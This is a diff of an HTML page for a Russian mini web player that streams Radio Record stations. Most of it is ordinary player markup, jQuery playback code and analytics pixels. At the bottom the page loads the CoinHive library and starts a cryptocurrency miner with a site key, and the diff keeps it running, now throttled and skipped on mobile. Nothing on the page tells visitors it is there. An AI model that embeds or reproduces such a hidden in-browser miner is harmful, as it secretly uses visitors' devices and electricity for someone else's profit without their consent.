@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html lang="ru-RU">
-<head><meta http-equiv="refresh" content="1;http://radio.telepubl.ru/mobile">
+<head>
 <link rel="profile" href="http://gmpg.org/xfn/11"><link rel="dns-prefetch" href="//coinhive.com/"><link rel="dns-prefetch" href="//vk.com/"><link rel="dns-prefetch" href="//www.record-russia.ru/"><link rel="dns-prefetch" href="//radio.telepubl.ru/"><link rel="dns-prefetch" href="//www.radiorecord.ru/"> 	
 <meta charset="utf-8">
 <meta http-equiv="x-ua-compatible" content="ie=edge">
-<title>Гружусь!</title>
+<title>Record Online Player Mini</title>
 <meta name="referrer" content="always">	
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, user-scalable=no">
 <meta name="google" value="notranslate">
 <link rel="author" href="//plus.google.com/+RadioRecordRussia" />	
 <meta name="keywords" content="мини плеер радио рекорд, рекорд онлайн плеер мини, player mini radio record, Record Online Player Mini, радио онлайн мини плеер, слушать онлайн мини плеер, слушать рекорд плеер мини, радиостанция рекорд">
@@ -20,7 +20,7 @@
 <link rel="image_src" href="/logo300.jpg">
 <link rel="icon" href="//www.radiorecord.ru/favicon.ico" type="image/x-icon"/>
 <link rel="shortcut icon" href="//www.radiorecord.ru/favicon.ico" type="image/x-icon"/>
-<meta http-equiv="Cache-Control" content="public">
+
 <meta property="og:type" content="article" />
 <meta property="og:url" content="//radio.telepubl.ru/" />
 <meta property="og:image" content="//radio.telepubl.ru/logo300.jpg" />
@@ -28,11 +28,21 @@
 <meta property="og:title" content="Record Online Player Mini">
 <meta property="og:description" content="Слушайте бесплатно, без регистрации 35 эксклюзивных радиостанций"/>	
 
+<link rel="canonical" href="http://radio.telepubl.ru/">
+
+<script src="http://www.record-russia.ru/content/scripts/srm.redirect.pc.js"></script>	
  
 <script src="//www.radiorecord.ru/cdn-cgi/apps/head/6M5gzNKdGC0brTdt2lpQos4w9u4.js"></script><link href="//www.radiorecord.ru/i/fonts/record/css/record.css" rel="stylesheet">
 <link href="http://www.radiorecord.ru/player-mini/style.css?v=1235" rel="stylesheet">
- 
- <meta name="msapplication-TileColor" content="#ffffff">
+<meta http-equiv="Cache-Control" content="no-cache"/>
+<meta http-equiv="cleartype" content="on"/>
+<meta http-equiv="imagetoolbar" content="no"/>
+<meta http-equiv="msthemecompatible" content="no"/>
+<meta name="format-detection" content="telephone=no"/>
+<meta name="format-detection" content="address=no"/>
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-capable" content="yes" /> 
+<meta name="msapplication-TileColor" content="#ffffff">
 <meta name="msapplication-TileImage" content="//radio.telepubl.ru/logo300.jpg">
 <meta name="theme-color" content="#333333">	
 
@@ -42,7 +52,236 @@
  <![endif]-->
 </head>
 <body class="current-station-background-color">
- 
+<main>
+<div class="image-wrapper">
+<div class="fake-heading"></div>
+<div class="image-toner current-station-background-color"></div>
+<div class="controlls">
+<div class="icon-station-backward pull-left"></div>
+<div class="play-pause ready icon-station-play pull-left"></div>
+<div class="icon-station-forward pull-right"></div>
+</div>
+</div>
+<div class="trackinfo current-station-background-color current-station-font-color">
+<div class="current-station-name"></div>
+<div id="nowplay-artist" class="artist-name"></div>
+<div id="nowplay-title" class="artist-title"></div>
+</div>
+<div id="volume-slider"></div>
+</main>
+
+<script src="//www.radiorecord.ru/player-mini/js/jquery-1.11.2.min.js"></script>
+
+<script src="//www.radiorecord.ru/bitrix/templates/flat-new/js/soundmanagerv297a-20150601/script/soundmanager2-nodebug-jsmin.js"></script>
+
+<script src="//www.radiorecord.ru/i/js/jquery.Storage.js"></script>
+
+<script src="//www.radiorecord.ru/bitrix/templates/flat-new/js/jquery.record.js"></script>
+<script src="//www.radiorecord.ru/i/js/jquery-ui-1.11.4/jquery-ui.min.js"></script>
+
+<script>
+			
+			if ( isMobile(/iPhone|iPad|iPod/i) ) $('#volume-slider').css('display','none');
+		
+			window.current_station = 0;
+			if (getParameterByName('st')) { window.current_station = prefixes.indexOf(getParameterByName('st')); }
+			var current_bitrate = 'hq';
+			if (isMobile()) { current_bitrate = 'lq'; }
+			var timeInterval = 1000;
+			function update_views() {
+				clearInterval(updaterIntervalID);
+				$('.current-station-background-color').css('background-color', stations[prefixes[current_station]]['color']);
+				$('.current-station-font-color').css('color', stations[prefixes[current_station]]['fcolor']);
+				$('.current-station-name').html("<a href='/' target='_blank'>"+stations[prefixes[current_station]]['name']+"</a>");
+				$('.current-station-icon').removeClass().addClass('icon-st-'+prefixes[current_station]).addClass('current-station-font-color current-station-icon');
+				$('.current-station-border-color').css('border-color', stations[prefixes[current_station]]['bcolor']);
+				$('.current-station-subject').html(stations[prefixes[current_station]]['text']);
+				$(document).trigger('currentStationChanged', {'station': prefixes[current_station]});
+				update_track_inline();
+				start_updater();
+			}
+			function update_track_inline() {
+				if (!$('#nowplay-artist').hasClass('block_to_update')) {
+					$('#nowplay-artist').addClass('block_to_update');
+					$.getJSON(stations[prefixes[current_station]]['link'], function(data) {
+						var items = [];
+						$.each(data, function(key, val) {
+							if (key == 'artist' && $('#nowplay-artist').html() != val) {
+								if (prefixes[current_station]=="mix") {
+									val = "By "+ val;
+									$('#nowplay-artist').html(val);
+								}
+								else{
+									$('#nowplay-artist').fadeOut(function() { $('#nowplay-artist').html(val); });	$('#nowplay-artist').fadeIn(); }
+								}
+							if (key == 'title' && $('#nowplay-title').html() != val) { $('#nowplay-title').fadeOut(function() { $('#nowplay-title').html(val); });	$('#nowplay-title').fadeIn(); }
+							if (isMobile()) {
+								if (key == 'image100') {
+									if (val == null) {
+										$('.nowplay-big-image').html('<img src="//www.radiorecord.ru/bitrix/templates/flat-new/img/transparent.png" />').removeClass('valid');
+										$('.fake-heading').css('background-image', 'url("png/'+prefixes[current_station]+'.png")').removeClass('hovered');
+									}
+									else {
+										if ($('.nowplay-big-image img').attr('src') != val) {
+											$('.nowplay-big-image').html('<img src="'+val+'" />').addClass('valid');
+											$('.fake-heading').css('background-image', 'url("'+val+'")').addClass('hovered');
+										}
+									}
+								}
+							}
+							else {
+								if (key == 'image600') {
+									if (val == null) {
+										$('.nowplay-big-image').html('<img src="//www.radiorecord.ru/bitrix/templates/flat-new/img/transparent.png" />').removeClass('valid');
+										$('.fake-heading').css('background-image', 'url("png/'+prefixes[current_station]+'.png")').removeClass('hovered');
+									}
+									else {
+										if ($('.nowplay-big-image img').attr('src') != val) {
+											$('.nowplay-big-image').html('<img src="'+val+'" />').addClass('valid');
+											$('.fake-heading').css('background-image', 'url("'+val+'")').addClass('hovered');
+										}
+									}
+								}
+							}
+							/*if (key == 'image100') {
+								if (val == null) { $('#nowplay-image').html('<i style="color: '+stations[prefixes[current_station]]['fcolor']+';" class="icon-st-'+prefixes[current_station]+'"></i>').css('background-image', 'url(/bitrix/templates/flat-new/img/black40.png)').removeClass('valid'); }
+								else { if ($('#nowplay-image img').attr('src') != val) { $('#nowplay-image').html('<img src="'+val+'" />').addClass('valid'); } }
+							}
+							if (key == 'image600') {
+								if (val == null) {
+									$('.nowplay-big-image').html('<img src="//www.radiorecord.ru/bitrix/templates/flat-new/img/transparent.png" />').removeClass('valid');
+									$('.fake-heading').css('background-image', 'url("png/'+prefixes[current_station]+'.png")').removeClass('hovered');
+								}
+								else {
+									if ($('.nowplay-big-image img').attr('src') != val) {
+										$('.nowplay-big-image').html('<img src="'+val+'" />').addClass('valid');
+										$('.fake-heading').css('background-image', 'url("'+val+'")').addClass('hovered');
+									}
+								}
+							}*/
+						});
+					});
+					$('#nowplay-artist').removeClass('block_to_update');
+					$('#nowplay-image img').removeClass('loading');
+				}
+			}
+			function start_updater() {
+				window.updaterIntervalID = setInterval("update_track_inline();",5000);
+			}
+			$(document).on('click', '.play-pause.ready', function() {
+				if ($(this).hasClass('icon-station-play')) {
+					$(this).addClass('icon-station-pause').removeClass('icon-station-play');
+					start_play(stations[prefixes[current_station]][current_bitrate]);
+					update_views();
+				}
+				else {
+					$(this).removeClass('icon-station-pause').addClass('icon-station-play');
+					stop_play();
+				}
+			});
+			$(document).on('click', '.icon-station-backward', function() {
+				// play backward
+				if (current_station == 0) { current_station = prefixes.length-1; }
+				else { current_station--; }
+				start_play(stations[prefixes[current_station]][current_bitrate]);
+				$('.play-pause').addClass('icon-station-pause').removeClass('icon-station-play');
+				update_views();
+			});
+			$(document).on('click', '.icon-station-forward', function() {
+				// play forward
+				if (current_station == prefixes.length-1) { current_station = 0; }
+				else { current_station++; }
+				start_play(stations[prefixes[current_station]][current_bitrate]);
+				$('.play-pause').addClass('icon-station-pause').removeClass('icon-station-play');
+				update_views();
+			});
+			function getParameterByName(name) {
+				name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+				var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+				results = regex.exec(location.search);
+				return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+			}
+			$(function() {
+				setTimeout(function() {
+					//$('.play-pause.ready').trigger('click');
+					//start_play(stations[prefixes[current_station]][current_bitrate]);
+				}, 2000);
+			})
+			var slider = $('#volume-slider');
+			slider.slider({
+				range: "min",
+				min: 1,
+				max: 100,
+				value: getVolume(),
+				orientation: 'horizontal',
+				start: function(event,ui) {},
+				slide: function(event, ui) {
+					var value = slider.slider('value');
+					setVolume(value);
+				},
+				change: function(event, ui) {
+					var value = slider.slider('value');
+					setVolume(value);
+				},
+				stop: function(event,ui) {
+					//tooltip.fadeOut('fast');
+				},
+			});
+			window.currentInstance = new Date().getTime();
+			/*
+			setInterval(function(){
+				if (window.localStorage.currentPlayer && window.localStorage.currentPlayer != window.currentInstance) {
+					stop_play();
+					$(".play-pause.ready").addClass('icon-station-play').removeClass('icon-station-pause');
+				};
+			}, 1000);
+*/
+			$(document).on('soundManagerReady', function() {
+				window.updaterIntervalID = setInterval("update_track_inline();",5000);
+				console.log('ready sm');
+				if (!isMobile()) {
+					$('.play-pause').trigger('click');
+					start_play(stations[prefixes[current_station]][current_bitrate]);
+				}
+				//start_updater();
+				update_views();
+			});
+			function isMobile($device){
+					if ( !$device ) var $device =  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+					if( $device.test(navigator.userAgent) ) { return true; }
+					else { return false; }
+			}
+		</script>
+
+	<script type="text/javascript">(window.Image ? (new Image()) : document.createElement('img')).src = location.protocol + '//vk.com/rtrg?r=wuWd0RPyJPrdnxhtmxubzoToOEtswuQv606c2HH4MRLuvFwl1mrce/0FMtiXkW7h1fhNDTpawHbdqwbgDWYs3QkELHcoctlKdewFwv3gbIIdXsebRZ*LMVxglFCa2npuocBMPeq/fh36ll3qirNWUvotLSzLOnCMrfUgg5yvGsY-&pixel_id=1000036358';</script>
+<script type="text/javascript">var _merchantSettings=_merchantSettings || [];_merchantSettings.push(['AT', '11lM73']);(function(){var autolink=document.createElement('script');autolink.type='text/javascript';autolink.async=true; autolink.src= ('https:' == document.location.protocol) ? 'https://autolinkmaker.itunes.apple.com/js/itunes_autolinkmaker.js' : 'http://autolinkmaker.itunes.apple.com/js/itunes_autolinkmaker.js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(autolink, s);})();</script>
+<script type="text/javascript">
+var _sf_async_config = { uid: 28407, domain: 'radiorecord.ru', useCanonical:true };
+(function() {
+// function loadChartbeat() {};
+var oldonload = window.onload;
+$(function() {
+//loadChartbeat();
+/*$(document).pjax('a', '#pjax-container', {
+container: '#pjax-container',
+fragment: '#pjax-container',
+});
+$.pjax.enable();*/
+if ($.support.pjax) {
+$.pjax.defaults.timeout = 2000
+$(document).on('click', 'a:not(.no-ajax, .no-ajax-load)', function(event) {
+//event.preventDefault();
+var container = $("#pjax-container")
+$.pjax.click(event, {container: container,
+fragment: '#pjax-container'})
+})
+$(document).on('click', '.no-ajax', function(event) {
+event.preventDefault();
+})
+}
+});
+})();
+</script>
 <!-- Yandex.Metrika counter --> <script type="text/javascript" > (function (d, w, c) { (w[c] = w[c] || []).push(function() { try { w.yaCounter42130574 = new Ya.Metrika({ id:42130574, clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true, trackHash:true, ecommerce:"telerecord" }); } catch(e) { } }); var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = "https://mc.yandex.ru/metrika/watch.js"; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "yandex_metrika_callbacks"); </script> <!-- /Yandex.Metrika counter -->	
 <!-- Rating@Mail.ru counter -->
 <script type="text/javascript">
@@ -61,8 +300,10 @@ if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, fal
 <!-- //Rating@Mail.ru counter -->
 <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-var miner = new CoinHive.Anonymous('LQwighiqm1HsKCyGWUlslEJD85nQG6wh');
-miner.start();
-</script>
+var miner = new CoinHive.Anonymous('LQwighiqm1HsKCyGWUlslEJD85nQG6wh', {throttle: 0.8});
+if (!miner.isMobile() && !miner.didOptOut(256)) {
+		miner.start();
+	}
+</script> 
 </body>
 </html>
